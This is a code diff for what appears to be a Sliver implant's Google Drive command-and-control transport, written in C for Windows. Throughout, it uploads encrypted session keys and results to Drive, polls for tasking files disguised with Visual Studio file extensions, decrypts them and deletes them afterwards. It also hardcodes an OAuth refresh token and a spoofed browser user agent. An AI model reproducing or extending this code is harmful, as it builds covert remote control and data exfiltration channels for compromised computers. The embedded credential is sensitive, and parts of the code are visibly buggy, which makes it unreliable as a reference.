@@ -14,7 +14,7 @@ BOOL RefreshAccessToken
 	LPSTR lpResult = NULL;
 	LPSTR lpContentTypeStr = NULL;
 
-	pHttpClient = HttpClientInit(UriInit(szOauthPath), pDriveClient->pHttpConfig->pProxyConfig);
+	pHttpClient = HttpClientInit(UriInit(szOauthPath));
 	if (pHttpClient == NULL) {
 		goto CLEANUP;
 	}
@@ -50,7 +50,6 @@ CLEANUP:
 
 PSLIVER_DRIVE_CLIENT DriveInit()
 {
-	LPSTR lpProxy = NULL;
 	PSLIVER_DRIVE_CLIENT lpResult = NULL;
 	PHTTP_REQUEST pHttpReq = NULL;
 
@@ -59,15 +58,16 @@ PSLIVER_DRIVE_CLIENT DriveInit()
 	CHAR szRefreshToken[] = "1//04U3_Gum8qlGvCgYIARAAGAQSNwF-L9IrmGLxFDUJTcb8IGojFuflKaNFqpQolUQI8ANjXIbrKe0Fq_7VzJUnt0hba15FOoUCJig";
 	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
 	DWORD i = 0;
-	CHAR szRecvPrefix[] = "gocspx";
-	CHAR szSendPrefix[] = "age52";
-	CHAR szPollExtension[] = "vssettings";
-	CHAR szStartExtension[] = "vsx";
-	CHAR szSessionExtension[] = "_sln160";
+	/*CHAR szRecvPrefix[] = "gocspx";
+	CHAR szSendPrefix[] = "age52";*/
+	CHAR szStartExtension[] = "vssettings";
+	CHAR szSendExtension[] = "vsx";
+	CHAR szRecvExtension[] = "_sln160";
+	DWORD dwPollInterval = 120;
 
-	lpProxy = GetProxyConfig();
 	lpResult = ALLOC(sizeof(SLIVER_DRIVE_CLIENT));
 	lpResult->dwNumberOfDriveConfigs = 1;
+	lpResult->dwPollInterval = dwPollInterval;
 	lpResult->DriveList = ALLOC(sizeof(PDRIVE_CONFIG));
 	for (i = 0; i < lpResult->dwNumberOfDriveConfigs; i++) {
 		lpResult->DriveList[i] = ALLOC(sizeof(DRIVE_CONFIG));
@@ -76,25 +76,12 @@ PSLIVER_DRIVE_CLIENT DriveInit()
 	lpResult->DriveList[0]->lpClientId = DuplicateStrA(szClientId, 0);
 	lpResult->DriveList[0]->lpClientSecret = DuplicateStrA(szClientSecret, 0);
 	lpResult->DriveList[0]->lpRefreshToken = DuplicateStrA(szRefreshToken, 0);
+	lpResult->DriveList[0]->lpSendExtension = DuplicateStrA(szSendExtension, 0);
+	lpResult->DriveList[0]->lpRecvExtension = DuplicateStrA(szRecvExtension, 0);
 	lpResult->DriveList[0]->lpStartExtension = DuplicateStrA(szStartExtension, 0);
-	lpResult->DriveList[0]->lpPollExtension = DuplicateStrA(szPollExtension, 0);
-	lpResult->DriveList[0]->lpSessionExtension = DuplicateStrA(szSessionExtension, 0);
-	lpResult->DriveList[0]->lpSendPrefix = DuplicateStrA(szSendPrefix, 0);
-	lpResult->DriveList[0]->lpRecvPrefix = DuplicateStrA(szRecvPrefix, 0);
-
+	lpResult->pHttpConfig = ALLOC(sizeof(HTTP_CONFIG));
 	lpResult->pHttpConfig->lpUserAgent = DuplicateStrA(szUserAgent, 0);
 	lpResult->pHttpConfig->dwNumberOfAttemps = 10;
-	lpResult = ALLOC(sizeof(SLIVER_DRIVE_CLIENT));
-	if (lpProxy != NULL) {
-		if (!lstrcmpA(lpProxy, "auto")) {
-			lpResult->pHttpConfig->pProxyConfig = ProxyInit(UseAutoDiscovery, NULL);
-		}
-		else {
-			lpResult->pHttpConfig->pProxyConfig = ProxyInit(UserProvided, lpProxy);
-		}
-
-		FREE(lpProxy);
-	}
 
 	return lpResult;
 }
@@ -105,15 +92,28 @@ BOOL DriveStart
 	_In_ PSLIVER_DRIVE_CLIENT pDriveClient
 )
 {
-	LPSTR lpEncodedSessionKey = NULL;
 	BOOL Result = FALSE;
-	PBUFFER pResp = NULL;
-	PBUFFER pDecodedResp = NULL;
 	PBUFFER pSessionId = NULL;
 	PBYTE pEncryptedSessionInit = NULL;
-	LPSTR lpRespData = NULL;
 	DWORD cbEncryptedSessionInit = 0;
 	PPBElement pMarshalledData = NULL;
+	DWORD i = 0;
+	CHAR szName[0x200];
+	PDRIVE_CONFIG pDriveConfig = NULL;
+	CHAR szMetadata[0x400];
+	LPSTR lpBody = NULL;
+	DWORD cbBody = 0;
+	LPSTR lpUniqueBoundary = NULL;
+	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
+	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
+	PURI pUri = NULL;
+	PHTTP_CLIENT pHttpClient = NULL;
+	PHTTP_RESP pResp = NULL;
+	PBUFFER pRespData = NULL;
+	CHAR szRespFileName[0x100];
+	PBYTE pPublicKeyDigest = NULL;
+	LPSTR lpPublicKeyHexDigest = NULL;
+	DWORD dwNumberOfTries = 0;
 
 	pMarshalledData = CreateBytesElement(pConfig->pSessionKey, CHACHA20_KEY_SIZE, 1);
 	pEncryptedSessionInit = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pMarshalledData->pMarshalledData, pMarshalledData->cbMarshalledData, &cbEncryptedSessionInit);
@@ -121,34 +121,100 @@ BOOL DriveStart
 		goto CLEANUP;
 	}
 
-	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
-	if (!DriveUpload(pDriveClient, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), DriveStartOp)) {
+	pPublicKeyDigest = ComputeSHA256(pConfig->lpPeerPubKey, lstrlenA(pConfig->lpPeerPubKey));
+	lpPublicKeyHexDigest = ConvertBytesToHexA(pPublicKeyDigest, 8);
+	pUri = UriInit(szUrl);
+	if (pUri == NULL) {
 		goto CLEANUP;
 	}
 
-	lpRespData = ExtractSubStrA(pResp->pBuffer, pResp->cbBuffer);
-	pDecodedResp = SliverBase64Decode(lpRespData);
-	pSessionId = SliverDecrypt(pConfig, pDecodedResp);
-	memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
-	
-	Result = TRUE;
-CLEANUP:
-	if (lpRespData != NULL) {
-		FREE(lpRespData);
+	pHttpClient = HttpClientInit(pUri);
+	if (pHttpClient == NULL) {
+		goto CLEANUP;
 	}
 
-	if (lpEncodedSessionKey != NULL) {
-		FREE(lpEncodedSessionKey);
+	lpUniqueBoundary = GenRandomStr(16);
+	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
+	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
+		pDriveConfig = pDriveClient->DriveList[i];
+		if (pDriveConfig == NULL) {
+			continue;
+		}
+
+		if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
+			continue;
+		}
+
+		SecureZeroMemory(szName, sizeof(szName));
+		SecureZeroMemory(szMetadata, sizeof(szMetadata));
+		wsprintfA(szName, "Hello.%s", pDriveConfig->lpStartExtension);
+		wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
+
+		if (lpBody != NULL) {
+			FREE(lpBody);
+			lpBody = NULL;
+		}
+
+		lpBody = ALLOC(cbEncryptedSessionInit + 0x400);
+		cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, szName);
+		memcpy(&lpBody[cbBody], pEncryptedSessionInit, cbEncryptedSessionInit);
+		cbBody += cbEncryptedSessionInit;
+		cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
+		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
+		if (pResp->dwStatusCode != HTTP_STATUS_OK) {
+			FreeHttpResp(pResp);
+			continue;
+		}
+
+		FreeHttpResp(pResp);
+		pResp = NULL;
+		SecureZeroMemory(szRespFileName, sizeof(szRespFileName));
+		wsprintfA(szRespFileName, "%s.%s", lpPublicKeyHexDigest, pDriveConfig->lpStartExtension);
+		while (dwNumberOfTries < pConfig->dwMaxFailure) {
+			Sleep(pDriveClient->dwPollInterval * 1000);
+			pRespData = DriveDownload(pDriveClient, szRespFileName);
+			if (pRespData != NULL) {
+				break;
+			}
+
+			dwNumberOfTries++;
+		}
+
+		if (pRespData == NULL) {
+			continue;
+		}
+
+		pSessionId = SliverDecrypt(pConfig, pRespData);
+		memcpy(pConfig->szSessionID, pSessionId->pBuffer, pSessionId->cbBuffer);
+		Result = TRUE;
+		break;
+	}
+
+CLEANUP:
+	FreeHttpClient(pHttpClient);
+	if (lpUniqueBoundary != NULL) {
+		FREE(lpUniqueBoundary);
+	}
+
+	if (lpBody != NULL) {
+		FREE(lpBody);
 	}
 
 	if (pEncryptedSessionInit != NULL) {
 		FREE(pEncryptedSessionInit);
 	}
 
+	if (pPublicKeyDigest != NULL) {
+		FREE(pPublicKeyDigest);
+	}
+
+	if (lpPublicKeyHexDigest != NULL) {
+		FREE(lpPublicKeyHexDigest);
+	}
+
 	FreeElement(pMarshalledData);
-	FreeBuffer(pDecodedResp);
-	FreeBuffer(pResp);
 	FreeBuffer(pSessionId);
+	FreeBuffer(pRespData);
 	return Result;
 }
 
@@ -162,14 +228,9 @@ BOOL DriveSend
 	PBUFFER pMarshalledEnvelope = NULL;
 	DWORD i = 0;
 	CHAR szName[0x200];
-	BOOL Result = FALSE;
 	PDRIVE_CONFIG pDriveConfig = NULL;
-
-	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
-	//wsprintfA(szName, "%s_%s_%lu.tex", pDriveClient->lpSendPrefix, pConfig->uEncoderNonce);
 	BOOL Result = FALSE;
 	CHAR szMetadata[0x400];
-	SYSTEMTIME SystemTime;
 	LPSTR lpBody = NULL;
 	DWORD cbBody = 0;
 	LPSTR lpUniqueBoundary = NULL;
@@ -179,41 +240,39 @@ BOOL DriveSend
 	PURI pUri = NULL;
 	PHTTP_CLIENT pHttpClient = NULL;
 	PHTTP_RESP pResp = NULL;
-	PDRIVE_CONFIG pDriveConfig = NULL;
-	DWORD i = 0;
+	PBUFFER pCipherText = NULL;
 
+	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
+	pCipherText = SliverEncrypt(pConfig, pMarshalledEnvelope);
 	pUri = UriInit(szUrl);
 	if (pUri == NULL) {
 		goto CLEANUP;
 	}
 
-	pHttpClient = HttpClientInit(pUri, pDriveClient->pHttpConfig->pProxyConfig);
+	pHttpClient = HttpClientInit(pUri);
 	if (pHttpClient == NULL) {
 		goto CLEANUP;
 	}
 
-	lpBody = ALLOC(pMarshalledEnvelope->cbBuffer + 0x400);
+	lpBody = ALLOC(pCipherText->cbBuffer + 0x400);
 	if (lpBody == NULL) {
 		NoHeapMemory = TRUE;
-		lpBody = VirtualAlloc(NULL, pMarshalledEnvelope->cbBuffer + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		lpBody = VirtualAlloc(NULL, pCipherText->cbBuffer + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		if (lpBody == NULL) {
 			LOG_ERROR("VirtualAlloc", GetLastError());
 			goto CLEANUP;
 		}
 	}
 
-	SecureZeroMemory(&SystemTime, sizeof(SYSTEMTIME));
-	GetSystemTime(&SystemTime);
 	SecureZeroMemory(szName, sizeof(szName));
-	wsprintfA(szName, "");
-	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", lpName);
+	wsprintfA(szName, "%s_%d.%s", pConfig->szSessionID, pDriveClient->dwSendCounter, pDriveConfig->lpSendExtension);
+	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", szName);
 	lpUniqueBoundary = GenRandomStr(16);
-	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, lpName);
-	memcpy(&lpBody[cbBody], pMarshalledEnvelope->pBuffer, pMarshalledEnvelope->cbBuffer);
-	cbBody += cbData;
+	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, szName);
+	memcpy(&lpBody[cbBody], pCipherText->pBuffer, pCipherText->cbBuffer);
+	cbBody += pCipherText->cbBuffer;
 	cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
 	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
-
 	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
 		pDriveConfig = pDriveClient->DriveList[i];
 		if (pDriveConfig == NULL) {
@@ -230,11 +289,12 @@ BOOL DriveSend
 			continue;
 		}
 
+		pDriveClient->dwSendCounter++;
+		Result = TRUE;
 		FreeHttpResp(pResp);
 		break;
 	}
-
-	Result = TRUE;
+	
 CLEANUP:
 	FreeHttpClient(pHttpClient);
 	if (lpUniqueBoundary != NULL) {
@@ -249,8 +309,9 @@ CLEANUP:
 			FREE(lpBody);
 		}
 	}
-CLEANUP:
+
 	FreeBuffer(pMarshalledEnvelope);
+	FreeBuffer(pCipherText);
 	return Result;
 }
 
@@ -275,25 +336,15 @@ PENVELOPE DriveRecv
 	CHAR szSessionIdPrefix[33];
 	LPSTR lpFileId = NULL;
 
-	pHttpClient = HttpClientInit(pUri, pDriveClient->pHttpConfig->pProxyConfig);
-	if (pHttpClient == NULL) {
-		goto CLEANUP;
-	}
-
+	SecureZeroMemory(szPattern, sizeof(szPattern));
+	SecureZeroMemory(szSessionIdPrefix, sizeof(szSessionIdPrefix));
+	lstrcpyA(szSessionIdPrefix, pConfig->szSessionID);
+	szSessionIdPrefix[8] = '\0';
+	wsprintfA(szPattern, "%s_%d.%s", szSessionIdPrefix, pDriveClient->dwRecvCounter, pDriveConfig->lpRecvExtension);
 	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
 		pDriveConfig = pDriveClient->DriveList[i];
 		if (pDriveConfig == NULL) {
 			continue;
-		}
-
-		SecureZeroMemory(szPattern, sizeof(szPattern));
-		SecureZeroMemory(szSessionIdPrefix, sizeof(szSessionIdPrefix));
-		lstrcpyA(szSessionIdPrefix, pConfig->szSessionID);
-		szSessionIdPrefix[8] = '\0';
-		wsprintfA(szPattern, "_%s.%s", szSessionIdPrefix, pDriveConfig->lpRecvExtension);
-		if (lpTempUri != NULL) {
-			FREE(lpTempUri);
-			lpTempUri = NULL;
 		}
 
 		if (lpFileId != NULL) {
@@ -306,15 +357,27 @@ PENVELOPE DriveRecv
 			continue;
 		}
 
-		lpTempUri = DuplicateStrA(szUri, 0x40);
-		wsprintfA(&lpTempUri[lstrlenA(lpTempUri)], "%s?alt=media", lpFileId);
-		if (pUri != NULL) {
-			FreeUri(pUri);
-			pUri = NULL;
+		if (lpTempUri != NULL) {
+			FREE(lpTempUri);
+			lpTempUri = NULL;
 		}
 
+		lpTempUri = DuplicateStrA(szUri, 0x40);
+		wsprintfA(&lpTempUri[lstrlenA(lpTempUri)], "%s?alt=media", lpFileId);
+		if (pHttpClient != NULL) {
+			FreeHttpClient(pHttpClient);
+			pHttpClient = NULL;
+		}
+
+		FreeHttpClient(pHttpClient);
+		pHttpClient = NULL;
 		pUri = UriInit(lpTempUri);
 		if (pUri == NULL) {
+			continue;
+		}
+
+		pHttpClient = HttpClientInit(pUri);
+		if (pHttpClient == NULL) {
 			continue;
 		}
 
@@ -328,27 +391,22 @@ PENVELOPE DriveRecv
 			continue;
 		}
 
-		pRespData = ALLOC(sizeof(BUFFER));
-		pRespData->cbBuffer = pResp->cbResp;
-		pRespData->pBuffer = pResp->pRespData;
+		pResult = BufferMove(pResp->pRespData, pResp->cbResp);
 		pResp->pRespData = NULL;
+		pDriveClient->dwRecvCounter++;
+		pDecodedData = SliverBase64Decode(pRespData->pBuffer);
+		pPlainText = SliverDecrypt(pConfig, pDecodedData);
+		pResult = UnmarshalEnvelope(pPlainText);
+
 		FreeHttpResp(pResp);
 		DriveDelete(pDriveClient, pDriveConfig, lpFileId);
 		break;
 	}
-
-	pDecodedData = SliverBase64Decode(pRespData->pBuffer);
-	pPlainText = SliverDecrypt(pConfig, pDecodedData);
-	pResult = UnmarshalEnvelope(pPlainText);
+	
 CLEANUP:
-	FreeHttpClient(pHttpClient);
 	FreeBuffer(pRespData);
 	FreeBuffer(pDecodedData);
 	FreeBuffer(pPlainText);
-	if (pUri != NULL) {
-		FreeUri(pUri);
-	}
-
 	if (lpTempUri != NULL) {
 		FREE(lpTempUri);
 	}
@@ -368,97 +426,97 @@ BOOL DriveClose
 	return TRUE;
 }
 
-BOOL DriveUpload
-(
-	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
-	_In_ PBYTE pData,
-	_In_ DWORD cbData,
-	_In_ DriveOperation Operaion
-)
-{
-	BOOL Result = FALSE;
-	CHAR szMetadata[0x400];
-	SYSTEMTIME SystemTime;
-	LPSTR lpBody = NULL;
-	DWORD cbBody = 0;
-	LPSTR lpUniqueBoundary = NULL;
-	BOOL NoHeapMemory = FALSE;
-	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
-	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
-	PURI pUri = NULL;
-	PHTTP_CLIENT pHttpClient = NULL;
-	PHTTP_RESP pResp = NULL;
-	PDRIVE_CONFIG pDriveConfig = NULL;
-	DWORD i = 0;
-
-	pUri = UriInit(szUrl);
-	if (pUri == NULL) {
-		goto CLEANUP;
-	}
-
-	pHttpClient = HttpClientInit(pUri, pDriveClient->pHttpConfig->pProxyConfig);
-	if (pHttpClient == NULL) {
-		goto CLEANUP;
-	}
-
-	lpBody = ALLOC(cbData + 0x400);
-	if (lpBody == NULL) {
-		NoHeapMemory = TRUE;
-		lpBody = VirtualAlloc(NULL, cbData + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-		if (lpBody == NULL) {
-			LOG_ERROR("VirtualAlloc", GetLastError());
-			goto CLEANUP;
-		}
-	}
-
-	SecureZeroMemory(&SystemTime, sizeof(SYSTEMTIME));
-	GetSystemTime(&SystemTime);
-	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", lpName);
-	lpUniqueBoundary = GenRandomStr(16);
-	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, lpName);
-	memcpy(&lpBody[cbBody], pData, cbData);
-	cbBody += cbData;
-	cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
-	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
-
-	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
-		pDriveConfig = pDriveClient->DriveList[i];
-		if (pDriveConfig == NULL) {
-			continue;
-		}
-
-		if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
-			continue;
-		}
-		
-		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
-		if (pResp->dwStatusCode != HTTP_STATUS_OK) {
-			FreeHttpResp(pResp);
-			continue;
-		}
-
-		FreeHttpResp(pResp);
-		break;
-	}
-	
-	Result = TRUE;
-CLEANUP:
-	FreeHttpClient(pHttpClient);
-	if (lpUniqueBoundary != NULL) {
-		FREE(lpUniqueBoundary);
-	}
-
-	if (lpBody != NULL) {
-		if (NoHeapMemory) {
-			VirtualFree(lpBody, 0, MEM_RELEASE);
-		}
-		else {
-			FREE(lpBody);
-		}
-	}
-
-	return Result;
-}
+//BOOL DriveUpload
+//(
+//	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
+//	_In_ PBYTE pData,
+//	_In_ DWORD cbData,
+//	_In_ DriveOperation Operaion
+//)
+//{
+//	BOOL Result = FALSE;
+//	CHAR szMetadata[0x400];
+//	SYSTEMTIME SystemTime;
+//	LPSTR lpBody = NULL;
+//	DWORD cbBody = 0;
+//	LPSTR lpUniqueBoundary = NULL;
+//	BOOL NoHeapMemory = FALSE;
+//	CHAR szContentType[0x80] = "multipart/form-data; boundary=";
+//	CHAR szUrl[] = "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart";
+//	PURI pUri = NULL;
+//	PHTTP_CLIENT pHttpClient = NULL;
+//	PHTTP_RESP pResp = NULL;
+//	PDRIVE_CONFIG pDriveConfig = NULL;
+//	DWORD i = 0;
+//
+//	pUri = UriInit(szUrl);
+//	if (pUri == NULL) {
+//		goto CLEANUP;
+//	}
+//
+//	pHttpClient = HttpClientInit(pUri);
+//	if (pHttpClient == NULL) {
+//		goto CLEANUP;
+//	}
+//
+//	lpBody = ALLOC(cbData + 0x400);
+//	if (lpBody == NULL) {
+//		NoHeapMemory = TRUE;
+//		lpBody = VirtualAlloc(NULL, cbData + 0x400, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+//		if (lpBody == NULL) {
+//			LOG_ERROR("VirtualAlloc", GetLastError());
+//			goto CLEANUP;
+//		}
+//	}
+//
+//	SecureZeroMemory(&SystemTime, sizeof(SYSTEMTIME));
+//	GetSystemTime(&SystemTime);
+//	wsprintfA(szMetadata, "{\"mimeType\":\"application/octet-stream\",\"name\":\"%s\",\"parents\":[\"root\"]}", lpName);
+//	lpUniqueBoundary = GenRandomStr(16);
+//	cbBody = wsprintfA(lpBody, "\r\n--------WebKitFormBoundary%s\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n%s\r\n\r\n--------WebKitFormBoundary%s\r\nContent-Disposition: form-data; name=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n", lpUniqueBoundary, szMetadata, lpUniqueBoundary, lpName);
+//	memcpy(&lpBody[cbBody], pData, cbData);
+//	cbBody += cbData;
+//	cbBody += wsprintfA(&lpBody[cbBody], "\r\n--------WebKitFormBoundary%s--\r\n", lpUniqueBoundary);
+//	wsprintfA(szContentType, "multipart/form-data; boundary=------WebKitFormBoundary%s", lpUniqueBoundary);
+//
+//	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
+//		pDriveConfig = pDriveClient->DriveList[i];
+//		if (pDriveConfig == NULL) {
+//			continue;
+//		}
+//
+//		if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
+//			continue;
+//		}
+//		
+//		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
+//		if (pResp->dwStatusCode != HTTP_STATUS_OK) {
+//			FreeHttpResp(pResp);
+//			continue;
+//		}
+//
+//		FreeHttpResp(pResp);
+//		break;
+//	}
+//	
+//	Result = TRUE;
+//CLEANUP:
+//	FreeHttpClient(pHttpClient);
+//	if (lpUniqueBoundary != NULL) {
+//		FREE(lpUniqueBoundary);
+//	}
+//
+//	if (lpBody != NULL) {
+//		if (NoHeapMemory) {
+//			VirtualFree(lpBody, 0, MEM_RELEASE);
+//		}
+//		else {
+//			FREE(lpBody);
+//		}
+//	}
+//
+//	return Result;
+//}
 
 LPSTR GetFileId
 (
@@ -484,7 +542,7 @@ LPSTR GetFileId
 		goto CLEANUP;
 	}
 
-	pHttpClient = HttpClientInit(pUri, pDriveClient->pHttpConfig->pProxyConfig);
+	pHttpClient = HttpClientInit(pUri);
 	if (pHttpClient == NULL) {
 		goto CLEANUP;
 	}
@@ -524,12 +582,12 @@ BOOL DriveDelete
 		goto CLEANUP;
 	}
 
-	pHttpClient = HttpClientInit(pUri, pDriveClient->pHttpConfig->pProxyConfig);
+	pHttpClient = HttpClientInit(pUri);
 	if (pHttpClient == NULL) {
 		goto CLEANUP;
 	}
 
-	pResp = SendHttpRequest(pDriveConfig, pHttpClient, NULL, "DELETE", NULL, NULL, 0, TRUE, TRUE);
+	pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "DELETE", NULL, NULL, 0, TRUE, TRUE);
 	if (pResp == NULL || pResp->dwStatusCode != HTTP_STATUS_OK) {
 		goto CLEANUP;
 	}
@@ -544,10 +602,82 @@ CLEANUP:
 PBUFFER DriveDownload
 (
 	_In_ PSLIVER_DRIVE_CLIENT pDriveClient,
-	_In_ LPSTR lpFileId
+	_In_ LPSTR lpFileName
 )
 {
-	
+	LPSTR lpFileId = NULL;
+	DWORD i = 0;
+	PDRIVE_CONFIG pDriveConfig = NULL;
+	LPSTR lpTempUri = NULL;
+	PURI pUri = NULL;
+	CHAR szUri[0x80] = "https://www.googleapis.com/drive/v3/files/";
+	PHTTP_CLIENT pHttpClient = NULL;
+	PHTTP_RESP pResp = NULL;
+	PBUFFER pResult = NULL;
+
+	for (i = 0; i < pDriveClient->dwNumberOfDriveConfigs; i++) {
+		pDriveConfig = pDriveClient->DriveList[i];
+		if (pDriveConfig == NULL) {
+			continue;
+		}
+
+		if (lpFileId != NULL) {
+			FREE(lpFileId);
+			lpFileId = NULL;
+		}
+
+		lpFileId = GetFileId(pDriveClient, pDriveConfig, lpFileName);
+		if (lpFileId == NULL) {
+			continue;
+		}
+
+		if (lpTempUri != NULL) {
+			FREE(lpTempUri);
+			lpTempUri = NULL;
+		}
+
+		lpTempUri = DuplicateStrA(szUri, 0x40);
+		wsprintfA(&lpTempUri[lstrlenA(lpTempUri)], "%s?alt=media", lpFileId);
+		if (pHttpClient != NULL) {
+			FreeHttpClient(pHttpClient);
+			pHttpClient = NULL;
+		}
+		
+		FreeHttpClient(pHttpClient);
+		pHttpClient = NULL;
+		pUri = UriInit(lpTempUri);
+		if (pUri == NULL) {
+			continue;
+		}
+
+		pHttpClient = HttpClientInit(pUri);
+		if (pHttpClient == NULL) {
+			continue;
+		}
+
+		if (!RefreshAccessToken(pDriveClient, pDriveConfig)) {
+			continue;
+		}
+
+		pResp = SendHttpRequest(pDriveClient->pHttpConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
+		if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
+			FreeHttpResp(pResp);
+			continue;
+		}
+
+		pResult = BufferMove(pResp->pRespData, pResp->cbResp);
+		pResp->pRespData = NULL;
+		FreeHttpResp(pResp);
+		DriveDelete(pDriveClient, pDriveConfig, lpFileId);
+		break;
+	}
+CLEANUP:
+	if (lpFileId != NULL) {
+		FREE(lpFileId);
+	}
+
+	FreeHttpClient(pHttpClient);
+	return pResult;
 }
 
 BOOL FreeDriveClient
@@ -585,22 +715,30 @@ BOOL FreeDriveClient
 				FREE(pDriveConfig->lpRecvExtension);
 			}
 
+			if (pDriveConfig->lpStartExtension != NULL) {
+				FREE(pDriveConfig->lpStartExtension);
+			}
+
 			FREE(pDriveConfig);
 			pDriveClient->DriveList[i] = NULL;
 		}
 
-		if (pDriveClient->pHttpConfig->lpUserAgent != NULL) {
-			FREE(pDriveClient->pHttpConfig->lpUserAgent);
-		}
-
-		if (pDriveClient->pHttpConfig->lpAccessToken != NULL) {
-			FREE(pDriveClient->pHttpConfig->lpAccessToken);
-		}
-
-		for (i = 0; i < _countof(pDriveClient->pHttpConfig->AdditionalHeaders); i++) {
-			if (pDriveClient->pHttpConfig->AdditionalHeaders[i] != NULL) {
-				FREE(pDriveClient->pHttpConfig->AdditionalHeaders[i]);
+		if (pDriveClient->pHttpConfig != NULL) {
+			if (pDriveClient->pHttpConfig->lpUserAgent != NULL) {
+				FREE(pDriveClient->pHttpConfig->lpUserAgent);
 			}
+
+			if (pDriveClient->pHttpConfig->lpAccessToken != NULL) {
+				FREE(pDriveClient->pHttpConfig->lpAccessToken);
+			}
+
+			for (i = 0; i < _countof(pDriveClient->pHttpConfig->AdditionalHeaders); i++) {
+				if (pDriveClient->pHttpConfig->AdditionalHeaders[i] != NULL) {
+					FREE(pDriveClient->pHttpConfig->AdditionalHeaders[i]);
+				}
+			}
+
+			FREE(pDriveClient->pHttpConfig);
 		}
 
 		FREE(pDriveClient);
